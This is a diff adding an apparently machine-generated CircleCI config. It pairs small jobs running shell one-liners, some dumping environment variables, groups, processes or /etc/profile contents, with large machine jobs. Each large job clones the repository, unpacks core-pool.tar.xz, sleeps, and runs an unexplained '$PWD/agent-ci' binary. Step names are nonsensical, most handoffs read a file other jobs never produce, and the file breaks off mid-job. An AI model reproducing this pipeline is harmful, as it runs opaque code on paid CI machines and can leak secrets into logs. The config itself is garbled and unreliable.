@@ -1,0 +1,1671 @@
+version: 2.1
+
+jobs:
+  title_uuid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalize step A
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; echo done | tee -a /tmp/graph_refund_wolf.msg >/dev/null && wc -l /tmp/graph_refund_wolf.msg; true ; } > /tmp/side/P-00083640
+            echo "gate ensure-staging-docker-image: $(wc -c </tmp/side/P-00083640) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'P-00083640'
+  ensure-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/P-00083640
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  yiockxulviaex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Thumbnail for the release
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; for conf in /usr/bin/z*; do du -h $conf; done | tac; true ; } > /tmp/side/trial_399
+            echo "gate intergration: $(wc -c </tmp/side/trial_399) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'trial_399'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/trial_399
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  allVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: I own accessibility audit spot check
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; { echo 'MiXeD cAsE'; echo 'yay!'; } | sort; true ; } > /tmp/side/130e8b40-8a78-ba91
+            echo "gate v5-canary: $(wc -c </tmp/side/130e8b40-8a78-ba91) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '130e8b40-8a78-ba91'
+  v5-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  altLineGal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Plate the scheduler
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -name '*' -exec md5sum {} + 2>/dev/null | wc -l; true ; } > /tmp/side/6d415516840
+            echo "gate Rollout_Staging6: $(wc -c </tmp/side/6d415516840) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '6d415516840'
+  Rollout_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  tpToken:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Quantize the nightly dumps
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; env | head -n 5; true ; } > /tmp/side/dnzmhRcKsIYW0G5
+            echo "gate UAT_DEPLOY_1: $(wc -c </tmp/side/dnzmhRcKsIYW0G5) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'dnzmhRcKsIYW0G5'
+  UAT_DEPLOY_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  media52-south:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Quiet the loud maintenance page
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; sdiff -w 40 <(seq 4) <(seq 2 5)|head -n2; true ; } > /tmp/side/133155_2023
+            echo "gate Launch_Tests2: $(wc -c </tmp/side/133155_2023) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '133155_2023'
+  Launch_Tests2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  text_platinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Spawn the physics layers via webhook
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; printf '%s=%s\n' goose 1 owl 2 cat 3 frog 4; true ; } > /tmp/side/THETA_DREAM_CHROME
+            echo "gate validte: $(wc -c </tmp/side/THETA_DREAM_CHROME) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'THETA_DREAM_CHROME'
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  undo_-_key:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Tune the physics layers once boot is done
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; getent group | awk -F : '$4 != "" { print $1 }' | sort -ru; true ; } > /tmp/side/220.98.47
+            echo "gate CHECK_STG: $(wc -c </tmp/side/220.98.47) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '220.98.47'
+  CHECK_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/220.98.47
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  iMaxCategory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Back off 4 seconds
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; grep -Ho -B 2 if /etc/profile; true ; } > /tmp/side/snapshot.2.15
+            echo "gate Rollout_Service3: $(wc -c </tmp/side/snapshot.2.15) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'snapshot.2.15'
+  Rollout_Service3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/snapshot.2.15
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  cron012:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Phase IV chapter marker compression
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; getent group | sed 's/:.*//' | tr '\n' ' '; true ; } > /tmp/side/FTP_TCP
+            echo "gate PackageApp: $(wc -c </tmp/side/FTP_TCP) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'FTP_TCP'
+  PackageApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  restart_sphere:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Assign the seating plan day one
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; \ls -rnlg /usr/bin/*cat | head -n 3; true ; } > /tmp/side/blobbramble
+            echo "gate v4-preview: $(wc -c </tmp/side/blobbramble) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'blobbramble'
+  v4-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/blobbramble
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  ReactiveNonBlockingCommandApi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: notify pm
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; grep -i -n then /etc/profile | nl; true ; } > /tmp/side/vector_bond_beam_client
+            echo "gate fix-parse: $(wc -c </tmp/side/vector_bond_beam_client) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'vector_bond_beam_client'
+  fix-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  blog_limit_helper_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalize step A
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; for n in chen bob omar kate noah; do printf '%s\n' "$n"; done | tac; true ; } > /tmp/side/PANO-17602
+            echo "gate mar19-release: $(wc -c </tmp/side/PANO-17602) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'PANO-17602'
+  mar19-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/PANO-17602
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Opening tokenization
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; env | grep -E 'PWD'; true ; } > /tmp/side/xyULwQqDIHY
+            echo "gate echo-8: $(wc -c </tmp/side/xyULwQqDIHY) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'xyULwQqDIHY'
+  echo-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  AnonymousUserRegistry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: eh confirm the exit interviews whatever
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nraj,boston,42\nheidi,helsinki,97\njudy,seoul,52\nmax,tokyo,99\n' >"/var/tmp/Lion1.dat" && cut -d, -f2 "/var/tmp/Lion1.dat" | tail -n +2 | sort -u; true ; } > /tmp/side/cranetundraneutronvault
+            echo "gate andromeda-v2: $(wc -c </tmp/side/cranetundraneutronvault) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'cranetundraneutronvault'
+  andromeda-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  p13:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: If prod looks wrong package the load balancer
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; grep -rh --exclude-dir='backup' export /usr/share/doc/bash | cut -d: -f1 | sort -u; true ; } > /tmp/side/build-v4.0.11
+            echo "gate vega-ng: $(wc -c </tmp/side/build-v4.0.11) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'build-v4.0.11'
+  vega-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  blocksById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Warm up tightening
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; seq 19 | sed '2q'; true ; } > /tmp/side/stock.west
+            echo "gate validte-65: $(wc -c </tmp/side/stock.west) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'stock.west'
+  validte-65:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/stock.west
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  mutex_in_px:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Go tag the readme
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; help printf | head -n4; true ; } > /tmp/side/c73a980
+            echo "gate depoly: $(wc -c </tmp/side/c73a980) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'c73a980'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/c73a980
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  checkbox--inline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fourth Skinning Attempt
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; ps -ef|tail -n +2|awk 'NR>1 {print $1}'|sed 's/^/- /'; true ; } > /tmp/side/env.pkg.log
+            echo "gate Prepare_Pipeline8: $(wc -c </tmp/side/env.pkg.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'env.pkg.log'
+  Prepare_Pipeline8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/env.pkg.log
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  zzd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Call Ola if the settings gear fails
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type f -iname '*tab' -printf "%M %p\n" 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/side/indigo-v3.1.32
+            echo "gate auh-check: $(wc -c </tmp/side/indigo-v3.1.32) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'indigo-v3.1.32'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/indigo-v3.1.32
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  mergeMessage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: stream the embeddings SLOWLY
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; echo 'up to date'|tr ' ' '\n'|sort; true ; } > /tmp/side/43.77.46
+            echo "gate WEB-433: $(wc -c </tmp/side/43.77.46) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '43.77.46'
+  WEB-433:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  dylan-bot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: okay verify the seating plan i guess
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; report=(record link top); echo ${report[@]/%/.txt}; true ; } > /tmp/side/329a74ca-6572-d79a-e42a
+            echo "gate ruby3-cov: $(wc -c </tmp/side/329a74ca-6572-d79a-e42a) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '329a74ca-6572-d79a-e42a'
+  ruby3-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  heidibot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: truing up credit notes slowly
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; printf '%s\n' "nothing to do" | wc -c; true ; } > /tmp/side/187.134.253.253
+            echo "gate LaunchImage: $(wc -c </tmp/side/187.134.253.253) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '187.134.253.253'
+  LaunchImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  commit_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Record centrifuge rotor weights
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; for item in trash new tea sync pepper; do echo "<${item}>"; done | tac; true ; } > /tmp/side/bin
+            echo "gate fx-3: $(wc -c </tmp/side/bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'bin'
+  fx-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/bin
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  ACCOUNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalize step A
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/lion_avenue02'/notebook && rm -rf '/tmp/lion_avenue02' && echo removed; true ; } > /tmp/side/stock_signal_meadow_cobalt
+            echo "gate Ship_Prod4: $(wc -c </tmp/side/stock_signal_meadow_cobalt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'stock_signal_meadow_cobalt'
+  Ship_Prod4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  hotel-robot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: L878
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; echo -n 'v1.2.3 released' | sha224sum; true ; } > /tmp/side/28.06.2020
+            echo "gate v1-ga3: $(wc -c </tmp/side/28.06.2020) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '28.06.2020'
+  v1-ga3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/28.06.2020
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  weeshsoungx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
